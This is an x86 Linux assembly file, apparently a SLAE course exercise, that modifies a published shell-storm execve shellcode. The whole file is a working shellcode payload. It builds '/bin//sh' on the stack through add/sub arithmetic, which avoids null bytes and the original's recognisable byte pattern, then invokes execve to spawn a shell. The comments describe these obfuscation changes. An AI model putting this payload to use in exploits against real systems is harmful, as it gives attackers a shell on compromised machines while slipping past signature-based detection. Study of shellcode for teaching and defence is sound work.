;; Modified execve shell code
;http://shell-storm.org/shellcode/files/shellcode-811.php> 
;SLAE-1268


global _start
_start:
	xor	ebx,ebx		; changed xoring of eax to ebx and moved to eax
	mov	eax,ebx
	push	ebx
	mov	eax,0x34399797 ; required value is divided by 2 and then added
	add	eax,0x34399798 ;
	push	eax 
	add	eax,0x05F63301 ; added remaining value to make second required value
	sub	eax,0x01       ; since the last value contained 00, added 1 and substracted
	push	eax
	mov	ecx,ebx
	mov	edx,ebx
	mov	eax,ebx
	mov	ebx,esp
	mov	al,0xb
	int	0x80
	xor	eax,eax
	inc	eax
	int	0x80
